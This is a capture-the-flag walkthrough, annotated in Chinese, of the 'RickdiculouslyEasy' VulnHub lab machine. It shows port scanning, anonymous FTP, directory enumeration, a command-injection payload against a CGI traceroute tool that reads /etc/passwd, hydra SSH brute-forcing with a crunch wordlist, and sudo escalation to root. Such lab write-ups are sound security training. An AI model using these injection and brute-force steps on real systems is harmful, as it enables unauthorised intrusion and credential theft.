## port scan

```sh
# Nmap 7.94SVN scan initiated Mon Feb 10 03:43:26 2025 as: nmap -sT --min-rate=8899 -p- -oN nmap_result/port 192.168.56.148
Nmap scan report for 192.168.56.148 (192.168.56.148)
Host is up (0.014s latency).
Not shown: 65528 closed tcp ports (conn-refused)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
9090/tcp  open  zeus-admin
13337/tcp open  unknown
22222/tcp open  easyengine
60000/tcp open  unknown
```

```sh
# Nmap 7.94SVN scan initiated Mon Feb 10 03:44:08 2025 as: nmap -sT -sVC -O -p21,22,80,9090,13337,22222,60000 -oN nmap_result/detils 192.168.56.148
Nmap scan report for 192.168.56.148 (192.168.56.148)
Host is up (0.00088s latency).

PORT      STATE SERVICE    VERSION
21/tcp    open  ftp        vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0              42 Aug 22  2017 FLAG.txt
|_drwxr-xr-x    2 0        0               6 Feb 12  2017 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.56.138
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  tcpwrapped
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp    open  http       Apache httpd 2.4.27 ((Fedora))
|_http-server-header: Apache/2.4.27 (Fedora)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Morty's Website
9090/tcp  open  http       Cockpit web service 161 or earlier
|_http-title: Did not follow redirect to https://192.168.56.148:9090/
13337/tcp open  tcpwrapped
22222/tcp open  ssh        OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey: 
|   2048 b4:11:56:7f:c0:36:96:7c:d0:99:dd:53:95:22:97:4f (RSA)
|   256 20:67:ed:d9:39:88:f9:ed:0d:af:8c:8e:8a:45:6e:0e (ECDSA)
|_  256 a6:84:fa:0f:df:e0:dc:e2:9a:2d:e7:13:3c:e7:50:a9 (ED25519)
60000/tcp open  tcpwrapped
MAC Address: 08:00:27:BF:52:95 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

枚举

```sh
┌──(kali㉿kali)-[~/vulnhub/RickdiculouslyEasy]
└─$ nc 192.168.56.148 22    
Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic x86_64)
                                                                                                                                                                          
┌──(kali㉿kali)-[~/vulnhub/RickdiculouslyEasy]
└─$ nc 192.168.56.148 13337
FLAG:{TheyFoundMyBackDoorMorty}-10Points
                                                                                                                                                                          
┌──(kali㉿kali)-[~/vulnhub/RickdiculouslyEasy]
└─$ nc 192.168.56.148 60000
Welcome to Ricks half baked reverse shell...
# ls
FLAG.txt  
# cat FLAG.txt
FLAG{Flip the pickle Morty!} - 10 Points
```

**ftp**

```shell
┌──(kali㉿kali)-[~/vulnhub/RickdiculouslyEasy]
└─$ ftp 192.168.56.148
Connected to 192.168.56.148.
220 (vsFTPd 3.0.3)
Name (192.168.56.148:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||65077|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              42 Aug 22  2017 FLAG.txt
drwxr-xr-x    2 0        0               6 Feb 12  2017 pub
226 Directory send OK.
ftp> get FLAG.txt
```

`FLAG{Whoa this is unexpected} - 10 Points`

## web

```sh
dirb http://192.168.56.148/             

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Feb 12 01:19:39 2025
URL_BASE: http://192.168.56.148/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.56.148/ ----
+ http://192.168.56.148/cgi-bin/ (CODE:403|SIZE:217)
+ http://192.168.56.148/index.html (CODE:200|SIZE:326)                                                                                                                   
==> DIRECTORY: http://192.168.56.148/passwords/
+ http://192.168.56.148/robots.txt (CODE:200|SIZE:126)                                                 
```

```
http://192.168.56.148/passwords/FLAG.txt
```

```sh
┌──(kali㉿kali)-[~/vulnhub/RickdiculouslyEasy]
└─$ curl http://192.168.56.148/passwords/passwords.html  
<!DOCTYPE html>
<html>
<head>
<title>Morty's Website</title>
<body>Wow Morty real clever. Storing passwords in a file called passwords.html? You've really done it this time Morty. Let me at least hide them.. I'd delete them entirely but I know you'd go bitching to your mom. That's the last thing I need.</body>
<!--Password: winter-->
</head>
</html>
```

发现密码`Password: winter`

`robots.txt`

```
They're Robots Morty! It's ok to shoot them! They're just Robots!

/cgi-bin/root_shell.cgi
/cgi-bin/tracertool.cgi
/cgi-bin/*
```

`http://192.168.56.148/cgi-bin/tracertool.cgi?ip=%3Bid%3Bwhoami`

成功执行命令，但是未能反弹shell

查看passwd文件，cat命令被替换了，tac即可

```
%3Btac%20/etc/passwd
```

三个用户

```
Summer:x:1002:1002::/home/Summer:/bin/bash
Morty:x:1001:1001::/home/Morty:/bin/bash
RickSanchez:x:1000:1000::/home/RickSanchez:/bin/bash
```

尝试ssh登录

```sh
hydra -L users.txt -P passwd.txt ssh://192.168.56.148:22222 -t 4 -vV -e ns     
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-12 01:26:20
[DATA] max 4 tasks per 1 server, overall 4 tasks, 15 login tries (l:3/p:5), ~4 tries per task
[DATA] attacking ssh://192.168.56.148:22222/
[22222][ssh] host: 192.168.56.148   login: Summer   password: winter
```

## 提权

```shell
[Summer@localhost Morty]$ pwd
/home/Morty
[Summer@localhost Morty]$ ls -la
total 64
drwxr-xr-x. 2 Morty Morty   131 Sep 15  2017 .
drwxr-xr-x. 5 root  root     52 Aug 18  2017 ..
-rw-------. 1 Morty Morty     1 Sep 15  2017 .bash_history
-rw-r--r--. 1 Morty Morty    18 May 30  2017 .bash_logout
-rw-r--r--. 1 Morty Morty   193 May 30  2017 .bash_profile
-rw-r--r--. 1 Morty Morty   231 May 30  2017 .bashrc
-rw-r--r--. 1 root  root    414 Aug 22  2017 journal.txt.zip
-rw-r--r--. 1 root  root  43145 Aug 22  2017 Safe_Password.jpg
```

```sh
strings Safe_Password.jpg 
JFIF
Exif
8 The Safe Password: File: /home/Morty/journal.txt.zip. Password: Meeseek
```

解压

```sh
┌──(kali㉿kali)-[~/vulnhub/RickdiculouslyEasy]
└─$ unzip journal.txt.zip 
Archive:  journal.txt.zip
[journal.txt.zip] journal.txt password: 
  inflating: journal.txt             

┌──(kali㉿kali)-[~/vulnhub/RickdiculouslyEasy]
└─$ cat journal.txt              
Monday: So today Rick told me huge secret. He had finished his flask and was on to commercial grade paint solvent. He spluttered something about a safe, and a password. Or maybe it was a safe password... Was a password that was safe? Or a password to a safe? Or a safe password to a safe?

Anyway. Here it is:

FLAG: {131333} - 20 Points
```

根据这个意思是一个密码：`131333`

```sh
[Summer@localhost RickSanchez]$ ls -la
total 16
drwxr-xr-x. 4 RickSanchez RickSanchez 134 Feb 11 15:08 .
drwxr-xr-x. 5 root        root         52 Aug 18  2017 ..
-rw-------. 1 RickSanchez RickSanchez  39 Feb 11 15:08 .bash_history
-rw-r--r--. 1 RickSanchez RickSanchez  18 May 30  2017 .bash_logout
-rw-r--r--. 1 RickSanchez RickSanchez 193 May 30  2017 .bash_profile
-rw-r--r--. 1 RickSanchez RickSanchez 231 May 30  2017 .bashrc
drwxr-xr-x. 2 RickSanchez RickSanchez  18 Sep 21  2017 RICKS_SAFE
drwxrwxr-x. 2 RickSanchez RickSanchez  26 Aug 18  2017 ThisDoesntContainAnyFlags
[Summer@localhost RickSanchez]$ cd ThisDoesntContainAnyFlags/
[Summer@localhost ThisDoesntContainAnyFlags]$ ls
NotAFlag.txt
[Summer@localhost ThisDoesntContainAnyFlags]$ cat NotAFlag.txt 
But seriously this isn't a flag..
hhHHAaaaAAGgGAh. You totally fell for it... Classiiiigihhic.
```

```sh
[Summer@localhost RICKS_SAFE]$ ls -la
total 12
drwxr-xr-x. 2 RickSanchez RickSanchez   18 Sep 21  2017 .
drwxr-xr-x. 4 RickSanchez RickSanchez  134 Feb 11 15:08 ..
-rwxr--r--. 1 RickSanchez RickSanchez 8704 Sep 21  2017 safe
[Summer@localhost RICKS_SAFE]$ cp safe /tmp/safe
[Summer@localhost RICKS_SAFE]$ cd /tmp
[Summer@localhost tmp]$ ls
safe
[Summer@localhost tmp]$ ./safe
Past Rick to present Rick, tell future Rick to use GOD DAMN COMMAND LINE AAAAAHHAHAGGGGRRGUMENTS!
[Summer@localhost tmp]$ ./safe 131333
decrypt:        FLAG{And Awwwaaaaayyyy we Go!} - 20 Points

Ricks password hints:
 (This is incase I forget.. I just hope I don't forget how to write a script to generate potential passwords. Also, sudo is wheely good.)
Follow these clues, in order


1 uppercase character
1 digit
One of the words in my old bands name.� @
```

`Ricks`的密码提示，一个大写字母+一个数字+一个老乐队名其中的词

![image-20250212143859478](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250212143859478.png)

**the Flesh Curtains**

使用`crunch`工具制造密码本

```
-t @,%^
              Specifies a pattern, eg: @@god@@@@ where the only the @'s, ,'s, %'s, and ^'s will change.
              @ will insert lower case characters
              , will insert upper case characters
              % will insert numbers
              ^ will insert symbols
```

```sh
crunch 10 10 -t ,%Curtains > pass.list
crunch 7 7 -t ,%Flesh >> pass.list
```

爆破ssh

```sh
hydra -l RickSanchez -P pass.list ssh://192.168.56.148:22222 -t 4 -vV -e ns
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-12 01:47:03
[DATA] max 4 tasks per 1 server, overall 4 tasks, 523 login tries (l:1/p:523), ~131 tries per task
[DATA] attacking ssh://192.168.56.148:22222/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://RickSanchez@192.168.56.148:22222
[INFO] Successful, password authentication is supported by ssh://192.168.56.148:22222
[22222][ssh] host: 192.168.56.148   login: RickSanchez   password: P7Curtains
[STATUS] attack finished for 192.168.56.148 (waiting for children to complete tests)
```

切换到RickSanchez

```sh
[RickSanchez@localhost ~]$ sudo -l
[sudo] password for RickSanchez: 
Matching Defaults entries for RickSanchez on localhost:
    !visiblepw, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL
    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User RickSanchez may run the following commands on localhost:
    (ALL) ALL
[RickSanchez@localhost ~]$ sudo bash
[root@localhost RickSanchez]# id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[root@localhost RickSanchez]# whoami
root
[root@localhost RickSanchez]# cd 
[root@localhost ~]# ls
anaconda-ks.cfg  FLAG.txt
[root@localhost ~]# tac FLAG.txt 
FLAG: {Ionic Defibrillator} - 30 points
```

